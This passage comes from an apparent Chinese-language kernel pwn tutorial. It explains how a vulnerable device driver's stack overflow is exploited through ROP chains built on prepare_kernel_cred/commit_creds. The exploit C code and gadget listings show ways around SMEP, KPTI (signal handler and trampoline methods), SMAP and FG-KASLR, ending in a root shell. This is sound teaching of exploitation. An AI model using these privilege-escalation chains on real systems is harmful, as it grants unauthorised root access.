user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = spawn_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;movabs rax,addr_prepare_kernel_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rdi,rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;call rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,rax;&quot;</span>          <span class="comment">//init_task.creds -&gt; rdi</span></span><br><span class="line">        <span class="string">&quot;movabs rax,addr_commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;call rax;&quot;</span>             <span class="comment">//commit_creds(init_task.creds)</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r15;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_canary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    read(dev_fd,buffer,<span class="number">0xA8</span>);</span><br><span class="line">    canary = *(<span class="type">size_t</span>*)((<span class="type">char</span>*)buffer+<span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = (<span class="type">size_t</span>)&amp;privilege_escalation;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h3 id="bypass-SMEP"><a href="#bypass-SMEP" class="headerlink" title="bypass SMEP"></a>bypass SMEP</h3><p><code>smep(supervisor mode execution protection)</code>: 内核态时不允许执行用户空间代码</p>
+<p><code>smep</code>类似于用户态的NX的概念,</p>
+<p><code>NX</code>不允许用户在堆栈里执行</p>
+<p><code>smep</code>不允许内核态执行用户代码 , 内核态只能执行内核态的代码</p>
+<p>之前在内核堆栈中构造<code>rop</code>链, 直接返回到用户代码,  会被<code>smep</code>拦住</p>
+<p>绕过方式:</p>
+<p>1.<code>CR4[bit20]</code>是SMEP开关, 在老版本内核上可以改成0绕过, 但是在新内核上CR4[bit20]被扎了钉子, 手动改成0会立刻被自动改回1</p>
+<p><img src="C:\Users\xidian\AppData\Roaming\Typora\typora-user-images\image-20241120211400284.png" alt="image-20241120211400284"></p>
+<p>2.全用内核<code>rop</code>绕过</p>
+<p>之前的exp失效的原因是, rop链上的返回地址, 是用户程序中的<code>privilege_escalation</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload[offset++] = (<span class="type">size_t</span>)&amp;privilege_escalation;</span><br></pre></td></tr></table></figure>
+
+<p><code>smep</code>要求在进入内核之后, 只能调用内核函数</p>
+<p>那么我们需要使用纯rop链代替<code>privilege_escalation</code>的功能</p>
+<p>那么这个<code>rop</code>链应该这样构造:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.addr prepare_kernel_cred</span><br><span class="line">2.gadget rax-&gt;rdi</span><br><span class="line">3.addr commit_cred</span><br><span class="line">4.addr swapgs; ret</span><br><span class="line">5.iretq</span><br><span class="line">6.RIP|CS|RFLAGS|SP|SS</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = addr_prepare_kernel_cred;   <span class="comment">//init_task.creds in rax</span></span><br><span class="line">    payload[offset++] = addr_xor_edi_edi_ret;</span><br><span class="line">    payload[offset++] = addr_mov_rdi_rax_ja_pop_rbp_ret;  </span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0   </span></span><br><span class="line">    payload[offset++] = addr_commit_creds;</span><br><span class="line">    payload[offset++] = addr_swapgs_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0</span></span><br><span class="line">    payload[offset++] = addr_iret;  <span class="comment">//rbx = 0</span></span><br><span class="line">    payload[offset++] = user_rip;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h4><p>在只开启<code>smep</code>, 不开启<code>smap</code>的情况下, 虽然控制流无法直接执行用户空间的程序</p>
+<p>但是可以直接访问用户空间的数据</p>
+<p>在用户空间上申请一块内存, 然后在rop链上构造堆栈迁移, 将内核堆栈搬到用户空间中, </p>
+<p>堆栈迁移的好处是:</p>
+<p>1.拥有更大的空间</p>
+<p>2.新堆栈可执行</p>
+<p>需要注意的是, <code>mmap</code>申请的页必须对齐到<code>0x1000</code></p>
+<p>用这个<code>gadget</code>, 实际上这个限制已经非常严苛了, 甚至查<code>rsp</code>的<code>gadget</code>查不到, </p>
+<p>查<code>esp</code>还是查到了两条, 幸运的是这两个地址也是在内核代码段里的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot;mov rsp, 0x.*000 ;.*; ret&quot;</span></span></span><br><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot;mov esp, 0x.*000 ;.*; ret&quot;</span></span></span><br><span class="line"><span class="number">0xffffffff8196f56a</span> : mov esp, <span class="number">0x5b000000</span> ; pop r12 ; pop rbp ; ret</span><br><span class="line"><span class="number">0xffffffff81971202</span> : xchg ebx, eax ; mov esp, <span class="number">0x5b000000</span> ; pop r12 ; pop rbp ; ret</span><br></pre></td></tr></table></figure>
+
+<p>在<code>x86_64</code>汇编中,对<code>esp</code>这种<code>32</code>为寄存器的搬运操作, 默认是无符号搬运, 也就是说</p>
+<p><code>mov esp, 0x5b000000 </code>只会给<code>esp</code>的低<code>32</code>位置数, 高<code>32</code>位置零</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">alloc_fake_stack</span><span class="params">()</span>&#123;</span><br><span class="line">    fake_stack = mmap((<span class="type">char</span>*)fake_stack_addr - <span class="number">0x1000</span>,<span class="number">0x2000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    fake_stack[<span class="number">0</span>] = <span class="number">0xdeadbeef</span>;		<span class="comment">//实际上写东西才会真正创建这个页</span></span><br><span class="line">    </span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    fake_stack[offset++] = addr_prepare_kernel_cred;   <span class="comment">//init_task.creds in rax</span></span><br><span class="line">    fake_stack[offset++] = addr_xor_edi_edi_ret;</span><br><span class="line">    fake_stack[offset++] = addr_mov_rdi_rax_ja_pop_rbp_ret;  </span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0   </span></span><br><span class="line">    fake_stack[offset++] = addr_commit_creds;</span><br><span class="line">    fake_stack[offset++] = addr_swapgs_pop_rbp_ret;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0</span></span><br><span class="line">    fake_stack[offset++] = addr_iret;  <span class="comment">//rbx = 0</span></span><br><span class="line">    fake_stack[offset++] = user_rip;</span><br><span class="line">    fake_stack[offset++] = user_cs;</span><br><span class="line">    fake_stack[offset++] = user_rflags;</span><br><span class="line">    fake_stack[offset++] = user_sp;</span><br><span class="line">    fake_stack[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,fake_stack,offset*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>0x5b000000 </code>这空间是用户空间的, 因此在开启smap之后, 这种方法会失效</p>
+<h3 id="bypass-KPTI"><a href="#bypass-KPTI" class="headerlink" title="bypass KPTI"></a>bypass KPTI</h3><p><code>Kernel page-table isolation</code> , 内核页表隔离</p>
+<p>开启kpti保护后, 用户态和内核态分别使用两张页表,</p>
+<p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
+<p>在用户态时,页表包含了全部用户空间与内核空间的很小一部分, 主要是系统调用入口</p>
+<p>在内核态时,页表包含了全部用户空间与全部内核空间, 但是用户空间的内存映射部分全都被标记为<strong>不可执行</strong>(但是还是可读写的)</p>
+<p>涉及到用户态与内核态的转换时, 首先要更换页表</p>
+<p>如果在内核态中不更换页表, 直接<code>iret</code>返回到用户空间想起<code>shell</code>会被<code>kpti</code>发现</p>
+<h4 id="signal-handler方法"><a href="#signal-handler方法" class="headerlink" title="signal handler方法"></a>signal handler方法</h4><p>虽然不更换页表直接返回到用户态, 会被<code>kpti</code>发现</p>
+<p>但是此时内核并不会崩溃,而是报告一个用户态的<code>SIGSEGV</code>信号</p>
+<blockquote>
+<p>为什么是用户态的段错误信号呢?</p>
+<p>因为此时已经<code>iret</code>返回到用户态了</p>
+<p>但是页表使用的仍然是<code>kpti</code>内核态页表, 而从这个也表上只能看出当前用户空间代码段没有x权限</p>
+<p>因此实际上类似于NX保护时尝试执行堆栈中的<code>shellcode</code>, 是一个道理</p>
+<p>因此是用户态的段错误</p>
+</blockquote>
+<p>调试发现, 当段错误信号发生时, 已经完成了<code>cred</code>的更换, 并且已经<code>iret</code>返回到了用户态</p>
+<p>在用户态刚要执行的第一条代码触发了中断, 内核给用户发送了<code>SIGSEGV</code></p>
+<p>如果此前用户已经注册了信号处理函数, <code>shell</code>作为<code>SIGSEGV</code>的处理函数, 内核会通过正常的中断处理程序返回到用户态, 内核自己正常返回时会自动切换页表, 因此经过这条路返回到用户态就正常了, 并且控制流也给到了shell函数中</p>
+<p>就可以起一个<code>root shell</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    signal(SIGSEGV, spawn_shell);</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak_canary();  <span class="comment">//泄露canary</span></span><br><span class="line">    overflow();     <span class="comment">//溢出,绕过canary,构造rop链</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="kpti-trampoline方法"><a href="#kpti-trampoline方法" class="headerlink" title="kpti trampoline方法"></a>kpti trampoline方法</h4><p>基于这样一点考虑:</p>
+<p>内核正常的系统调用如果能走某条路成功着陆用户态,那么<strong>我们也可以借道</strong></p>
+<p>这个道就叫<code>kpti trampoline</code>, 这道可以 <code>更换页表, swapgs, iretq</code></p>
+<blockquote>
+<p>trampoline是指内核态返回到用户态的缓冲, 因此叫做蹦床</p>
+</blockquote>
+<p>位于内核函数<code>	swapgs_restore_regs_and_return_to_usermode </code>中</p>
+<blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ Linux-5.14/arch/x86/entry/entry_64.S</span></span><br><span class="line">SYM_CODE_START_LOCAL(common_interrupt_return)</span><br><span class="line">SYM_INNER_LABEL(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_ENTRY</span></span><br><span class="line">	<span class="comment">/* Assert that pt_regs indicates user mode. */</span></span><br><span class="line">	testb	$<span class="number">3</span>, CS(%rsp)</span><br><span class="line">	jnz	<span class="number">1f</span></span><br><span class="line">	ud2</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	POP_REGS pop_rdi=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span></span><br><span class="line"><span class="comment">	 * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy the IRET frame to the trampoline stack. */</span></span><br><span class="line">	pushq	<span class="number">6</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* SS */</span></span><br><span class="line">	pushq	<span class="number">5</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* RSP */</span></span><br><span class="line">	pushq	<span class="number">4</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* EFLAGS */</span></span><br><span class="line">	pushq	<span class="number">3</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* CS */</span></span><br><span class="line">	pushq	<span class="number">2</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* RIP */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Push user RDI on the trampoline stack. */</span></span><br><span class="line">	pushq	(%rdi)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">	 * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Restore RDI. */</span></span><br><span class="line">	popq	%rdi</span><br><span class="line">	SWAPGS</span><br><span class="line">	INTERRUPT_RETURN</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>标号1这部分是正文</p>
+<p>在这部分中,首先<code>POP_REGS pop_rdi=0</code>这是个宏, 它会从栈上弹出一系列值交给寄存器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//@Linux5.14/arch/x86/entry/calling.h</span><br><span class="line">.macro POP_REGS pop_rdi=1 skip_r11rcx=0</span><br><span class="line">	popq %r15</span><br><span class="line">	popq %r14</span><br><span class="line">	popq %r13</span><br><span class="line">	popq %r12</span><br><span class="line">	popq %rbp</span><br><span class="line">	popq %rbx</span><br><span class="line">	.if \skip_r11rcx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.else</span><br><span class="line">	popq %r11</span><br><span class="line">	.endif</span><br><span class="line">	popq %r10</span><br><span class="line">	popq %r9</span><br><span class="line">	popq %r8</span><br><span class="line">	popq %rax</span><br><span class="line">	.if \skip_r11rcx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.else</span><br><span class="line">	popq %rcx</span><br><span class="line">	.endif</span><br><span class="line">	popq %rdx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.if \pop_rdi</span><br><span class="line">	popq %rdi</span><br><span class="line">	.endif</span><br><span class="line">.endm</span><br></pre></td></tr></table></figure>
+
+<p>接下来rdi指向旧堆栈, 从gs段拿出rsp0交给rsp</p>
+<p>然后把老堆栈上保存的用户上下文压到新堆栈里</p>
+<p>然后更换页表</p>
+<p>然后swapgs</p>
+<p>然后iret</p>
+<p>实际上此时iret使用的堆栈, 已经是新堆栈了,不是老堆栈</p>
+</blockquote>
+<p>具体干了啥可以看反汇编</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms  | grep swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#POP_REGS部分省略</span><br><span class="line"></span><br><span class="line">  0xffffffff81200f26 &lt;_stext+2101030&gt;: mov    rdi,rsp</span><br><span class="line">  0xffffffff81200f29 &lt;_stext+2101033&gt;: mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">  0xffffffff81200f32 &lt;_stext+2101042&gt;: push   QWORD PTR [rdi+0x30]		;用户ss</span><br><span class="line">  0xffffffff81200f35 &lt;_stext+2101045&gt;: push   QWORD PTR [rdi+0x28]		;用户rsp</span><br><span class="line">  0xffffffff81200f38 &lt;_stext+2101048&gt;: push   QWORD PTR [rdi+0x20]		;用户eflags</span><br><span class="line">  0xffffffff81200f3b &lt;_stext+2101051&gt;: push   QWORD PTR [rdi+0x18]		;用户cs</span><br><span class="line">  0xffffffff81200f3e &lt;_stext+2101054&gt;: push   QWORD PTR [rdi+0x10]		;用户rip</span><br><span class="line">  0xffffffff81200f41 &lt;_stext+2101057&gt;: push   QWORD PTR [rdi]			;老栈顶</span><br><span class="line">  0xffffffff81200f43 &lt;_stext+2101059&gt;: push   rax</span><br><span class="line">  0xffffffff81200f44 &lt;_stext+2101060&gt;: xchg   ax,ax</span><br><span class="line">  0xffffffff81200f46 &lt;_stext+2101062&gt;: mov    rdi,cr3</span><br><span class="line">  0xffffffff81200f49 &lt;_stext+2101065&gt;: jmp    0xffffffff81200f7f &lt;_stext+2101119&gt;</span><br><span class="line">  </span><br><span class="line">  0xffffffff81200f7f &lt;_stext+2101119&gt;: or     rdi,0x1000			#蜜汁操作</span><br><span class="line">  0xffffffff81200f86 &lt;_stext+2101126&gt;: mov    cr3,rdi</span><br><span class="line">  0xffffffff81200f89 &lt;_stext+2101129&gt;: pop    rax</span><br><span class="line">  0xffffffff81200f8a &lt;_stext+2101130&gt;: pop    rdi</span><br><span class="line">  0xffffffff81200f8b &lt;_stext+2101131&gt;: swapgs</span><br><span class="line">  0xffffffff81200f8e &lt;_stext+2101134&gt;: nop    DWORD PTR [rax]</span><br><span class="line">  0xffffffff81200f91 &lt;_stext+2101137&gt;: jmp    0xffffffff81200fc0 &lt;_stext+2101184&gt;</span><br><span class="line">  </span><br><span class="line">  0xffffffff81200fc0 &lt;_stext+2101184&gt;: test   BYTE PTR [rsp+0x20],0x4</span><br><span class="line">  0xffffffff81200fc5 &lt;_stext+2101189&gt;: jne    0xffffffff81200fc9 &lt;_stext+2101193&gt;	#这个调试观察不会跳</span><br><span class="line">  0xffffffff81200fc7 &lt;_stext+2101191&gt;: iretq</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个很迷的操作, 把<code>cr3</code>里面的页表地址拿出来, 或了一个<code>0x1000</code>再放回去, 就完成了内核态-用户态页表的更换, 这是因为这俩页表地址还真就是这样挨着存放的, 这哥俩被称为一个<code>CR3 Pair</code></p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/a99b0d0eef40d94aa386ee0d903b5a64.png" alt="CR3 Pair"></p>
+<blockquote>
+<p>这种伙伴形式还见于完全二叉树:</p>
+<p>如果根从1开始编号, 那么其他节点的编号异或1就是其兄弟节点</p>
+</blockquote>
+<p>如果构造ROP链, 返回到<code>    0xffffffff81200f26 &lt;_stext+2101030&gt;: mov    rdi,rsp</code>这一行</p>
+<p>下面还要填充两个dummy来满足这两个pop</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81200f89 &lt;_stext+2101129&gt;: pop    rax</span><br><span class="line">0xffffffff81200f8a &lt;_stext+2101130&gt;: pop    rdi</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="bypass-SMAP"><a href="#bypass-SMAP" class="headerlink" title="bypass SMAP"></a>bypass SMAP</h3><p>smap意味着内核态无法访问用户态任何数据</p>
+<p>象内核栈迁移到用户态映射区就白搭了</p>
+<p>但是纯用rop链还是可以的</p>
+<h3 id="bypass-KASLR"><a href="#bypass-KASLR" class="headerlink" title="bypass KASLR"></a>bypass KASLR</h3><p><code>FG-KASLR</code>,不光整个内核镜像基地址随机, 部分函数之间的相对偏移量也会变, 真是死🐎了</p>
+<p>如果使用<code>readelf -S ./vmlinux | grep &quot;.text&quot;</code>查看text节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">^C</span><br><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># readelf -S ./vmlinux | grep <span class="string">&quot;.text&quot;</span> | head -n 15</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS         ffffffff81000000  <span class="number">00200000</span></span><br><span class="line">  [ <span class="number">2</span>] .rela.text        RELA             <span class="number">0000000000000000</span>  <span class="number">024</span>d3b10</span><br><span class="line">  [ <span class="number">3</span>] .text.unlike[...] PROGBITS         ffffffff81400dd7  <span class="number">00600</span>dd7</span><br><span class="line">  [ <span class="number">4</span>] .text.__star[...] PROGBITS         ffffffff81400e90  <span class="number">00600e90</span></span><br><span class="line">  [ <span class="number">5</span>] .text.__do_s[...] PROGBITS         ffffffff81400ea0  <span class="number">00600</span>ea0</span><br><span class="line">  [ <span class="number">6</span>] .text.__xen_[...] PROGBITS         ffffffff81400eb0  <span class="number">00600</span>eb0</span><br><span class="line">  [ <span class="number">7</span>] .text.vvar_mremap PROGBITS         ffffffff81400ed0  <span class="number">00600</span>ed0</span><br><span class="line">  [ <span class="number">8</span>] .text.vdso_fault  PROGBITS         ffffffff81400f00  <span class="number">00600f</span>00</span><br><span class="line">  [ <span class="number">9</span>] .text.map_vdso    PROGBITS         ffffffff81400f90  <span class="number">00600f</span>90</span><br><span class="line">  [<span class="number">10</span>] .text.map_vd[...] PROGBITS         ffffffff814010c0  <span class="number">006010</span>c0</span><br><span class="line">  [<span class="number">11</span>] 